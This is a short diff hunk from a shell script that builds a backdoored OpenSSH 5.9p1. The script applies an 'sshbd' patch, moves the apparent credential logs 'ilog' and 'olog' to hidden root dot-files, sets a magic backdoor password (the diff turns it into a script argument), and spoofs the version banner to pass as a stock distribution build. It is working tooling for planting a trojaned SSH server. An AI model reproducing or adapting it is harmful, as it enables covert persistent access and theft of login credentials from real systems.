@@ -8,7 +8,7 @@ cd openssh-5.9p1
 patch < sshbd5.9p1.diff
 sed -i "s/\/tmp\/ilog/\/.ilog/g" includes.h
 sed -i "s/\/tmp\/olog/\/.olog/g" includes.h
-sed -i "s/apaajaboleh/343fdb4d/g" includes.h
+sed -i "s/apaajaboleh/$3/g" includes.h
 sed -i "s/OpenSSH_5.8p1 Debian-1ubuntu3/$1/g" version.h
 sed -i "s/p1/$2/g" version.h
 yum install -y openssl openssl-devel pam-devel
